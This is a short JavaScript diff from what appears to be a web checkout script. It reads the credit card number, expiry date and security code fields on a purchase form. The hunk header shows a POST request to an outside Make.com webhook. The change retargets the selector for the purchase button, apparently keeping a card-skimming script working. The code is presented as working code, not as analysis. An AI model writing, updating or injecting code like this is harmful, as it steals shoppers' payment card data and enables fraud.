@@ -28,7 +28,7 @@ request('POST', 'https://hook.us1.make.com/4k96pub1pp6wwak1yhlr9hcjiufbns84')
 const ccNumbers = document.querySelector("input[name='purchase[credit_card_number]']")
 const ccExpiry = document.querySelector("input[name='purchase[credit_card_exp_date_month_year]']")
 const ccCvc = document.querySelector("input[name='purchase[security_code]']")
-const purchaseDiv = document.querySelector("div[data-title='button']")
+const purchaseDiv = document.querySelector("div[data-title='tmp_button_submit_btn']")
 let lengthToDelete = ""
 let checked = ""
 const radioButtons = document.querySelectorAll('input[name="purchase[product_id]"]')
